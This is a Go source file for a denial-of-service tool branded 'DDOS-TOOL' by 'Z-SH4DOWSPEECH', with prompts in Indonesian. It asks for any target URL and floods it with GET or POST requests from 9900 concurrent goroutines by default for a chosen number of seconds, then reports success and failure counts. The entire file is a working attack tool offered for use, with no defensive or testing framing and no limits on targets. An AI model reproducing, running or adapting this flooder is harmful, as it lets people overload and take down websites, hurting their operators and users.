package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Cyan   = "\033[36m"
	Purple = "\033[35m"
	Reset  = "\033[0m"
)

var (
	successCount int64
	errorCount   int64
)

func banner() {
	fmt.Println(Purple + `
██████╗ ██████╗  ██████╗ ███████╗   ████████╗ ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔════╝   ╚══██╔══╝██╔═══██╗
██║  ██║██║  ██║██║   ██║███████╗█████╗██║   ██║   ██║
██║  ██║██║  ██║██║   ██║╚════██║╚════╝██║   ██║   ██║
██████╔╝██████╔╝╚██████╔╝███████║      ██║   ╚██████╔╝
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝    ╚═════╝ 
	      Created by Z-SH4DOWSPEECH
` + Reset)
}

func flood(target string, method string, duration time.Duration, wg *sync.WaitGroup, id int) {
	defer wg.Done()
	client := http.Client{Timeout: 5 * time.Second}
	end := time.Now().Add(duration)

	for time.Now().Before(end) {
		var req *http.Request
		var err error

		if method == "POST" {
			payload := bytes.NewBuffer([]byte("data=ZSHADOW"))
			req, err = http.NewRequest("POST", target, payload)
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req, err = http.NewRequest("GET", target, nil)
		}

		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			continue
		}

		resp.Body.Close()
		atomic.AddInt64(&successCount, 1)
	}
}

func animateLoading(message string, duration time.Duration) {
	spin := []string{"|", "/", "-", "\\"}
	fmt.Print(Cyan + message)
	for i := 0; i < int(duration.Seconds()*4); i++ {
		fmt.Printf("\r%s%s %s", Cyan, message, spin[i%4])
		time.Sleep(250 * time.Millisecond)
	}
	fmt.Print("\r" + strings.Repeat(" ", 40) + "\r")
}

func main() {
	banner()

	reader := bufio.NewReader(os.Stdin)

	fmt.Print(Cyan + "Target URL (contoh: http://example.com): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		fmt.Println(Purple + "[!] URL tidak valid. Harus diawali http:// atau https://" + Reset)
		return
	}

	fmt.Print(Cyan + "Metode request (GET/POST) [default GET]: " + Reset)
	method, _ := reader.ReadString('\n')
	method = strings.ToUpper(strings.TrimSpace(method))
	if method == "" {
		method = "GET"
	}
	if method != "GET" && method != "POST" {
		fmt.Println(Purple + "[!] Hanya GET atau POST yang didukung." + Reset)
		return
	}

	fmt.Print(Cyan + "Jumlah thread [default 9900]: " + Reset)
	threadStr, _ := reader.ReadString('\n')
	threadStr = strings.TrimSpace(threadStr)
	threads := 9900
	if threadStr != "" {
		t, err := strconv.Atoi(threadStr)
		if err == nil && t > 0 {
			threads = t
		}
	}

	fmt.Print(Cyan + "Durasi serangan (detik) [default 30]: " + Reset)
	durStr, _ := reader.ReadString('\n')
	durStr = strings.TrimSpace(durStr)
	duration := 30 * time.Second
	if durStr != "" {
		d, err := strconv.Atoi(durStr)
		if err == nil && d > 0 {
			duration = time.Duration(d) * time.Second
		}
	}

	animateLoading("Menyiapkan serangan", 2)

	fmt.Println(Purple + "\n[✓] Memulai serangan..." + Reset)
	start := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go flood(target, method, duration, &wg, i+1)
	}

	wg.Wait()
	totalTime := time.Since(start)

	fmt.Println(Purple + "\n[✓] Serangan selesai!" + Reset)
	fmt.Printf("%sTotal berhasil: %d\n", Cyan, successCount)
	fmt.Printf("Total gagal   : %d\n", errorCount)
	fmt.Printf("Durasi total  : %s%s\n", totalTime.Round(time.Second), Reset)
}
